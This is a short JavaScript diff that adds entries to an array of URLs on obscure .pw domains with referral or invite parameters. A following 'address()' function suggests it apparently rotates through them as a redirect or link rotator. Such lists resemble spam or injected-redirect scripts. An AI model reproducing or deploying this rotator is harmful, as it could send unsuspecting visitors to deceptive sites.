@@ -4,7 +4,11 @@ var s=[
 "http://bonbar.pw/?i=SMakvLNv",
 "http://bonsad.pw/?i=SMakvLNv",
 "http://bongard.pw/?i=SMakvLNv",
-"http://bondar.pw/?i=SMakvLNv"
+"http://bondar.pw/?i=SMakvLNv",
+"http://boniks.pw/?inv=jahdfcgf",
+"http://bonustok.pw/?inv=jahdfcgf",
+"http://rubbon.pw/?i=2257",
+"http://rubdar.pw/?i=2027"
 ];
 var adr,i,x=0,c=s.length;
 function address() {
